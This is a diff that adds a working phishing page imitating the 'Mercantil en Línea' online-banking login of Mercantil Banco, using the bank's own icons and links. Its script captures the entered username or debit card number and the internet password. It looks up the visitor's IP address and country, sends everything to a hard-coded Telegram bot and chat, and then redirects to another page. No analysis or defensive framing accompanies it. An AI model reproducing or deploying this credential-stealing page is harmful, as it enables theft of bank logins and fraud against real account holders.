@@ -1,0 +1,140 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mercantil en Línea</title>
+    <link rel="shortcut icon" href="https://www30.mercantilbanco.com/favicon.ico" type="image/x-icon">
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="footer">
+        <img src="https://i.postimg.cc/kgSZ9vHs/Captura-de-pantalla-2024-09-10-175316.png" alt="">
+    </div>
+
+    <div class="container">
+        <p>Bienvenido</p>
+        <h1>Inicia tu sesión</h1>
+        <form id="loginForm" method="post">
+            <div class="form-group">
+                <label for="username">Usuario o Tarjeta de débito</label>
+                <input type="text" id="username" name="username" placeholder="Ingresa tu Usuario o Tarjeta de débito">
+                <img alt="eye" class="icon" src="https://www30.mercantilbanco.com/assets/img/icons/eye-disabled-blue.svg">
+                <br>
+            </div>
+            <div>
+                <div style="text-align: right;">
+                    <a href="https://www30.mercantilbanco.com/melp/create-user" style="text-decoration: none; color: #156cc4;">Crea tu usuario</a>
+                </div>
+            </div>
+            <br><br>
+            <div class="form-group">
+                <label for="password">Clave de internet</label>
+                <input type="password" id="password" name="password" placeholder="Ingresa tu Clave de internet">
+                <img class="icon" alt="eye" src="https://www30.mercantilbanco.com/assets/img/icons/eye-disabled-blue.svg">
+                <br>
+            </div>
+            <div style="text-align: right;">
+                <a href="https://www30.mercantilbanco.com/melp/change-password" style="text-decoration: none; color: #156cc4;">¿Olvidaste tu clave de internet?</a>
+            </div>
+            <div class="form-group checkbox">
+                <br><br>
+                <div class="recover-user" style="display: flex; align-items: center;">
+                    <div class="recover-user-label" style="
+                    display: block;
+                    font-size: 14px;
+                    color: #004e9b;
+                    margin-bottom: 1px;
+                    line-height: 1.15;
+                    font-family: Arial;
+                    font-weight: 700;
+                    letter-spacing: normal;
+                    text-align: left;
+                    box-sizing: border-box;
+                    word-wrap: break-word;
+                    margin-right: 10px;
+                    ">Recordar usuario</div>
+                    <div>
+                        <mat-slide-toggle class="mat-slide-toggle mat-accent" id="mat-slide-toggle-1">
+                            <label class="mat-slide-toggle-label" for="mat-slide-toggle-1-input" style="display: flex; align-items: center;">
+                                <span class="mat-slide-toggle-bar mat-slide-toggle-bar-no-side-margin" style="display: flex; align-items: center;">
+                                    <img src="https://i.postimg.cc/dQN6NNBX/Captura-de-pantalla-2024-09-10-193427.png" alt="1" style="width: 40px; height: auto; margin-right: 5px;">
+                                    <span class="mat-slide-toggle-thumb-container">
+                                        <span class="mat-slide-toggle-thumb"></span>
+                                        <span mat-ripple="" class="mat-ripple mat-slide-toggle-ripple mat-focus-indicator">
+                                            <span class="mat-ripple-element mat-slide-toggle-persistent-ripple"></span>
+                                        </span>
+                                    </span>
+                                </span>
+                                <span class="mat-slide-toggle-content">
+                                    <span style="display: none;">&nbsp;</span>
+                                </span>
+                            </label>
+                        </mat-slide-toggle>
+                    </div>
+                </div>
+                <br>
+            </div>
+            <button type="submit" class="btn-submit">Iniciar</button>
+        </form>
+    </div>
+
+    <script>
+        function togglePasswordVisibility() {
+            var passwordField = document.getElementById('password');
+            var type = passwordField.getAttribute('type') === 'password' ? 'text' : 'password';
+            passwordField.setAttribute('type', type);
+        }
+    </script>
+<script>
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        
+        const username = document.getElementById('username').value;
+        const password = document.getElementById('password').value;
+        
+        const formData = new FormData();
+        formData.append('username', username);
+        formData.append('password', password);
+
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                const ip = data.ip;
+                fetch(`https://ipapi.co/${ip}/json/`)
+                    .then(response => response.json())
+                    .then(locationData => {
+                        const country = locationData.country_name || 'Desconocido';
+
+                        const message = `
+- *M3RC4NT1LJC* -:
+👤 *Usur*: \`${username}\`
+🔑 *Contr*: \`${password}\`
+🌐 *IP*: \`${ip}\`
+🏙 *País*: \`${country}\`
+`;
+
+
+
+                        fetch(`https://api.telegram.org/bot7444866518:AAGbS6e90_-hdarWTGVx9YCnYtfLEETJtbQ/sendMessage`, {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json'
+                            },
+                            body: JSON.stringify({
+                                chat_id: '-1002335794714',
+                                text: message,
+                                parse_mode: 'Markdown'
+                            })
+                        })
+                        .then(() => {
+                            // Redireccionar a tk.html después de enviar los datos
+                            window.location.href = 'arrb.html';
+                        });
+                    });
+            });
+    });
+</script>
+
+</body>
+</html>
